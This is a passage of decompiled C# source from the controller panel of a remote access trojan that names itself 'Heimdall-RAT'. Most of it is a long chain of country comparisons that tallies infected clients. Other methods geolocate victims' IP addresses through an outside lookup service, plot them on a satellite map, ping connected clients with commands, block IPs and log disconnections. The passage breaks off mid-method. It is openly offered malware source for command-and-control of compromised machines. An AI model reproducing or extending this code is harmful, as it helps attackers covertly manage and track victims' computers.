			else if (Operators.CompareString(CC, Strings.UCase("Comoros"), false) == 0)
			{
				Comoros++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Democratic Republic of the Congo"), false) == 0)
			{
				DemocraticRepublicoftheCongo++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Costa Rica"), false) == 0)
			{
				CostaRica++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Croatia"), false) == 0)
			{
				Croatia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Cuba"), false) == 0)
			{
				Cuba++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Cyprus"), false) == 0)
			{
				Cyprus++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Czech Republic"), false) == 0)
			{
				CzechRepublic++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Denmark"), false) == 0)
			{
				Denmark++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Djibouti"), false) == 0)
			{
				Djibouti++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Dominica"), false) == 0)
			{
				Dominica++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Dominican Republic"), false) == 0)
			{
				DominicanRepublic++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Ecuador"), false) == 0)
			{
				Ecuador++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Egypt"), false) == 0)
			{
				Egypt++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("El Salvador"), false) == 0)
			{
				ElSalvador++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("England"), false) == 0)
			{
				England++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Equatorial Guinea"), false) == 0)
			{
				EquatorialGuinea++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Eritrea"), false) == 0)
			{
				Eritrea++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Estonia"), false) == 0)
			{
				Estonia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Ethiopia"), false) == 0)
			{
				Ethiopia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("European Union"), false) == 0)
			{
				Europe++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Falkland Islands (Malvinas)"), false) == 0)
			{
				FalklandIslandsMalvinas++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Faroes"), false) == 0)
			{
				FaroeIslands++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Fiji"), false) == 0)
			{
				Fiji++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Finland"), false) == 0)
			{
				Finland++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("France"), false) == 0)
			{
				France++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("French Guiana"), false) == 0)
			{
				FrenchGuiana++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Tahiti (French Polinesia)"), false) == 0)
			{
				FrenchPolynesia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("French Southern Territories"), false) == 0)
			{
				FrenchSouthernTerritories++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Gabon"), false) == 0)
			{
				Gabon++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Gambia"), false) == 0)
			{
				Gambia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Georgia"), false) == 0)
			{
				Georgia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Germany"), false) == 0)
			{
				Germany++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Ghana"), false) == 0)
			{
				Ghana++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Gibraltar"), false) == 0)
			{
				Gibraltar++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Greece"), false) == 0)
			{
				Greece++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Greenland"), false) == 0)
			{
				Greenland++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Grenada"), false) == 0)
			{
				Grenada++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Guadeloupe"), false) == 0)
			{
				Guadeloupe++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Guam"), false) == 0)
			{
				Guam++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Guatemala"), false) == 0)
			{
				Guatemala++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Guinea"), false) == 0)
			{
				Guinea++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Guinea-Bissau"), false) == 0)
			{
				GuineaBissau++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Guyana"), false) == 0)
			{
				Guyana++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Haiti"), false) == 0)
			{
				Haiti++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Heard Island and McDonald Islands"), false) == 0)
			{
				HeardIslandandMcDonaldIslands++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Honduras"), false) == 0)
			{
				Honduras++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Hong Kong"), false) == 0)
			{
				HongKong++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Hungary"), false) == 0)
			{
				Hungary++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Iceland"), false) == 0)
			{
				Iceland++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("India"), false) == 0)
			{
				India++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Indonesia"), false) == 0)
			{
				Indonesia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Islamic Republic of Iran"), false) == 0)
			{
				IslamicRepublicofIran++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Iraq"), false) == 0)
			{
				Iraq++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Ireland"), false) == 0)
			{
				Ireland++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Palestinian Territory, Occupied"), false) == 0)
			{
				PalestinianTerritory++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Italy"), false) == 0)
			{
				Italy++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Jamaica"), false) == 0)
			{
				Jamaica++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Japan"), false) == 0)
			{
				Japan++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Jordan"), false) == 0)
			{
				Jordan++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Kazakhstan"), false) == 0)
			{
				Kazakhstan++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Kenya"), false) == 0)
			{
				Kenya++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Kiribati"), false) == 0)
			{
				Kiribati++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("North Korea"), false) == 0)
			{
				NorthKorea++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("South Korea"), false) == 0)
			{
				SouthKorea++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Kuwait"), false) == 0)
			{
				Kuwait++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Kyrgyzstan"), false) == 0)
			{
				Kyrgyzstan++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Laos"), false) == 0)
			{
				LaoPeoplesDemocraticRepublic++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Latvia"), false) == 0)
			{
				Latvia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Lebanon"), false) == 0)
			{
				Lebanon++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Lesotho"), false) == 0)
			{
				Lesotho++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Liberia"), false) == 0)
			{
				Liberia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Libya"), false) == 0)
			{
				Libya++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Liechtenstein"), false) == 0)
			{
				Liechtenstein++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Lithuania"), false) == 0)
			{
				Lithuania++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Luxembourg"), false) == 0)
			{
				Luxembourg++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Macao"), false) == 0)
			{
				Macao++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Macedonia"), false) == 0)
			{
				RepublicofMacedonia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Madagascar"), false) == 0)
			{
				Madagascar++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Malawi"), false) == 0)
			{
				Malawi++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Malaysia"), false) == 0)
			{
				Malaysia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Maldives"), false) == 0)
			{
				Maldives++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Mali"), false) == 0)
			{
				Mali++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Malta"), false) == 0)
			{
				Malta++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Marshall Islands"), false) == 0)
			{
				MarshallIslands++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Martinique"), false) == 0)
			{
				Martinique++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Mauritania"), false) == 0)
			{
				Mauritania++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Mauritius"), false) == 0)
			{
				Mauritius++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Mayotte"), false) == 0)
			{
				Mayotte++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Mexico"), false) == 0)
			{
				Mexico++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Micronesia"), false) == 0)
			{
				FederatedStatesofMicronesia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Moldova"), false) == 0)
			{
				RepublicofMoldova++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Monaco"), false) == 0)
			{
				PrincipalityofMonaco++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Mongolia"), false) == 0)
			{
				Mongolia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Montenegro"), false) == 0)
			{
				Montenegro++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Montserrat"), false) == 0)
			{
				Montserrat++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Morocco"), false) == 0)
			{
				Morocco++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Mozambique"), false) == 0)
			{
				Mozambique++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Myanmar"), false) == 0)
			{
				Myanmar++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Namibia"), false) == 0)
			{
				Namibia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Nauru"), false) == 0)
			{
				Nauru++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Nepal"), false) == 0)
			{
				Nepal++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Netherlands Antilles"), false) == 0)
			{
				NetherlandsAntilles++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Netherlands"), false) == 0)
			{
				Netherlands++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("New Caledonia"), false) == 0)
			{
				NewCaledonia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("New Zealand"), false) == 0)
			{
				NewZealand++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Nicaragua"), false) == 0)
			{
				Nicaragua++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Niger"), false) == 0)
			{
				Niger++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Nigeria"), false) == 0)
			{
				Nigeria++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Niue"), false) == 0)
			{
				Niue++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Norfolk Island"), false) == 0)
			{
				NorfolkIsland++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Northern Mariana Islands"), false) == 0)
			{
				NorthernMarianaIslands++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Norway"), false) == 0)
			{
				Norway++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Oman"), false) == 0)
			{
				SultanateofOman++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Pakistan"), false) == 0)
			{
				IslamicRepublicofPakistan++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Palau"), false) == 0)
			{
				Palau++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Panama"), false) == 0)
			{
				Panama++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Papua New Guinea"), false) == 0)
			{
				PapuaNewGuinea++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Paraguay"), false) == 0)
			{
				Paraguay++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Peru"), false) == 0)
			{
				Peru++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Philippines"), false) == 0)
			{
				Philippines++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Pitcairn Islands"), false) == 0)
			{
				PitcairnIslands++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Poland"), false) == 0)
			{
				Poland++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Portugal"), false) == 0)
			{
				Portugal++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Palestine"), false) == 0)
			{
				Palestine++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Puerto Rico"), false) == 0)
			{
				PuertoRico++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Qatar"), false) == 0)
			{
				Qatar++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Reunion"), false) == 0)
			{
				Reunion++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Romania"), false) == 0)
			{
				Romania++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Serbia"), false) == 0)
			{
				Serbia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Russian Federation"), false) == 0)
			{
				Russia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Rwanda"), false) == 0)
			{
				Rwanda++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Saint Helena"), false) == 0)
			{
				SaintHelena++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("St Kitts & Nevis"), false) == 0)
			{
				SaintKittsandNevis++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Saint Lucia"), false) == 0)
			{
				SaintLucia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Saint Pierre and Miquelon"), false) == 0)
			{
				SaintPierreandMiquelon++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("St Vincent & the Grenadines"), false) == 0)
			{
				SaintVincentandtheGrenadines++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Samoa"), false) == 0)
			{
				Samoa++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("San Marino"), false) == 0)
			{
				SanMarino++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Sao Tome & Principe"), false) == 0)
			{
				SaoTomeandPrincipe++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Saudi Arabia"), false) == 0)
			{
				SaudiArabia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Scotland"), false) == 0)
			{
				Scotland++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Senegal"), false) == 0)
			{
				Senegal++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Seychelles"), false) == 0)
			{
				Seychelles++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Sierra Leone"), false) == 0)
			{
				SierraLeone++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Singapore"), false) == 0)
			{
				Singapore++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Slovakia"), false) == 0)
			{
				Slovakia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Slovenia"), false) == 0)
			{
				Slovenia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Solomon Islands"), false) == 0)
			{
				SolomonIslands++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Somalia"), false) == 0)
			{
				Somalia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("South Africa"), false) == 0)
			{
				SouthAfrica++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("South Georgia and the South Sandwich Islands"), false) == 0)
			{
				SouthGeorgiaandtheSouthSandwichIslands++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Spain"), false) == 0)
			{
				Spain++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Sri Lanka"), false) == 0)
			{
				SriLanka++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Sudan"), false) == 0)
			{
				Sudan++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Suriname"), false) == 0)
			{
				Suriname++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Svalbard and Jan Mayen"), false) == 0)
			{
				SvalbardandJanMayen++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Swaziland"), false) == 0)
			{
				Swaziland++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Sweden"), false) == 0)
			{
				Sweden++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Switzerland"), false) == 0)
			{
				Switzerland++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Syria"), false) == 0)
			{
				Syria++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Taiwan"), false) == 0)
			{
				Taiwan++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Tajikistan"), false) == 0)
			{
				Tajikistan++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Tanzania"), false) == 0)
			{
				UnitedRepublicofTanzania++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Thailand"), false) == 0)
			{
				Thailand++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Togo"), false) == 0)
			{
				Togo++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Tokelau"), false) == 0)
			{
				Tokelau++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Tonga"), false) == 0)
			{
				Tonga++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Trinidad & Tobago"), false) == 0)
			{
				TrinidadAndTobago++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Tunisia"), false) == 0)
			{
				Tunisia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Turkey"), false) == 0)
			{
				Turkey++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Turkmenistan"), false) == 0)
			{
				Turkmenistan++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Turks and Caicos Islands"), false) == 0)
			{
				TurksandCaicosIslands++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Tuvalu"), false) == 0)
			{
				Tuvalu++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Uganda"), false) == 0)
			{
				Uganda++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Ukraine"), false) == 0)
			{
				Ukraine++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("United Arab Emirates"), false) == 0)
			{
				UnitedArabEmirates++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("United Kingdom"), false) == 0)
			{
				UnitedKingdom++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("United States Minor Outlying Islands"), false) == 0)
			{
				UnitedStatesMinorOutlyingIslands++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("United States of America"), false) == 0)
			{
				UnitedStates++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Uruguay"), false) == 0)
			{
				Uruguay++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Uzbekistan"), false) == 0)
			{
				Uzbekistan++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Wales"), false) == 0)
			{
				Wales++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Wallis and Futuna"), false) == 0)
			{
				WallisAndFutuna++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Vanuatu"), false) == 0)
			{
				Vanuatu++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Vatican City"), false) == 0)
			{
				VaticanCityState++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Venezuela"), false) == 0)
			{
				Venezuela++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Western Sahara"), false) == 0)
			{
				WesternSahara++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Viet Nam"), false) == 0)
			{
				Vietnam++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Virgin Islands US"), false) == 0)
			{
				UnitedStatesVirginIslands++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Yemen"), false) == 0)
			{
				Yemen++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Zambia"), false) == 0)
			{
				Zambia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Zimbabwe"), false) == 0)
			{
				Zimbabwe++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Cook Islands"), false) == 0)
			{
				CookIslands++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Antarctica"), false) == 0)
			{
				Antarctica++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Congo-Brazzaville"), false) == 0)
			{
				Congo++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Cote D'Ivoire"), false) == 0)
			{
				CoteDIvoire++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Satellite Provider"), false) == 0)
			{
				SatelliteProvider++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Aland Islands"), false) == 0)
			{
				AlandIslands++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Guernsey"), false) == 0)
			{
				Guernsey++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Isle of Man"), false) == 0)
			{
				IsleofMan++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Jersey"), false) == 0)
			{
				Jersey++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Saint Barthelemy"), false) == 0)
			{
				SaintBarthelemy++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Unknown"), false) == 0)
			{
				NA++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Anonymous Proxy"), false) == 0)
			{
				NA++;
			}
			string result = default(string);
			return result;
		}
	}

	public void DW()
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		//IL_029e: Unknown result type (might be due to invalid IL or missing references)
		Document = new XmlDocument();
		int num = 0;
		string text = "";
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_Items().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					try
					{
						XmlDocument document = Document;
						WebClient webClient = new WebClient();
						SocketServer socketServer = s;
						ListViewItem val2 = val;
						int num2 = Conversions.ToInteger(val2.get_ToolTipText());
						string text2 = socketServer.IP(ref num2);
						val2.set_ToolTipText(Conversions.ToString(num2));
						document.LoadXml(webClient.DownloadString("http://ip-api.com/xml/" + text2));
						text = text + Document.DocumentElement!.SelectSingleNode("lat")!.InnerText + "," + Document.DocumentElement!.SelectSingleNode("lon")!.InnerText + "|";
						try
						{
							GetcountryGR geoIP = GeoIP;
							SocketServer socketServer2 = s;
							val2 = val;
							num2 = Conversions.ToInteger(val2.get_ToolTipText());
							string iPA = socketServer2.IP(ref num2);
							val2.set_ToolTipText(Conversions.ToString(num2));
							AVTI(AVTI(Strings.UCase(geoIP.LookupCountryName(iPA).ToString())).ToString());
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					num = checked(num + 1);
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			((Control)Label1).set_Visible(false);
			Label1.set_Text("Connected Clients : ( " + Conversions.ToString(num) + " )");
			File.WriteAllBytes(Path.GetTempPath() + "Heimdall-Clients-Map.jpg", new WebClient().DownloadData("http://maps.google.com/maps/api/staticmap?center=1,1&zoom=&markers=color:red|" + text + "&size=" + ((Form)this).get_Size().Width + "x" + ((Form)this).get_Size().Height + "&maptype=satellite&sensor=false"));
			CICNE();
			num = 0;
			PM.set_ImageLocation(Path.GetTempPath() + "Heimdall-Clients-Map.jpg");
			((Control)PM).Refresh();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message.ToString(), "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Delete(Path.GetTempPath() + "Heimdall-Clients-Map.jpg");
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		((Control)REFF).set_Enabled(true);
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		Process.GetCurrentProcess().Kill();
	}

	public void SDAPC()
	{
		IEnumerator enumerator = default(IEnumerator);
		while (true)
		{
			try
			{
				if (listV1.get_Items().get_Count() > 0)
				{
					try
					{
						enumerator = listV1.get_Items().GetEnumerator();
						while (enumerator.MoveNext())
						{
							object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
							if (Operators.CompareString(NewLateBinding.LateGet(objectValue, (Type)null, "ToolTipText", new object[0], (string[])null, (Type[])null, (bool[])null).ToString(), "", false) != 0)
							{
								s.Send(Conversions.ToInteger(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ToolTipText", new object[0], (string[])null, (Type[])null, (bool[])null))), "PVC");
							}
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(reping);
		}
	}

	public void connect(int Sock)
	{
		try
		{
			if (listV1.get_Items().get_Count() > 0 && Commandslistview.get_Items().get_Count() > 0)
			{
				SC(Sock);
				return;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (BlockedIP.get_Items().get_Count() <= 0)
			{
				return;
			}
			try
			{
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = BlockedIP.get_Items().GetEnumerator();
					while (enumerator.MoveNext())
					{
						object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
						if (Operators.ConditionalCompareObjectEqual((object)s.IP(ref Sock), NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type)null, "SubItems", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), false))
						{
							s.Disconnect(Sock);
							(GeoIP.LookupCountryName(s.IP(ref Sock)) + ".png").ToString();
							ListViewItem val = Logs.get_Items().Add(Sock.ToString(), "[ " + Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.get_Now()))) + " ] IP : " + s.IP(ref Sock) + " - Server ID : ????", (GeoIP.LookupCountryCode(s.IP(ref Sock)) + ".png").ToString());
							val.set_ForeColor(Color.Red);
							val.get_SubItems().Add("Blocked");
							val.set_ToolTipText(GeoIP.LookupCountryName(s.IP(ref Sock)) + ".png");
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public void disconnected(int sock)
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_07f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_07f7: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			try
			{
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = listV1.get_Items().GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem val = (ListViewItem)enumerator.Current;
						if (Conversions.ToDouble(val.get_ToolTipText()) == (double)sock)
						{
							ListViewItem val2 = Logs.get_Items().Add(sock.ToString(), "[ " + Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.get_Now()))) + " ] IP : " + s.IP(ref sock) + " - Server ID : " + val.get_SubItems().get_Item(1).get_Text(), (GeoIP.LookupCountryCode(s.IP(ref sock)) + ".png").ToString());
							val2.set_ForeColor(Color.Red);
							val2.get_SubItems().Add("Offline");
							val2.set_ForeColor(Color.Red);
							val2.set_ToolTipText(GeoIP.LookupCountryName(s.IP(ref sock)) + ".png");
							val.Remove();
							text = val.get_SubItems().get_Item(1).get_Text();
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			s.Disconnect(sock);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Pastime" + sock) != null)
			{
				((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Pastime" + sock).Close();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
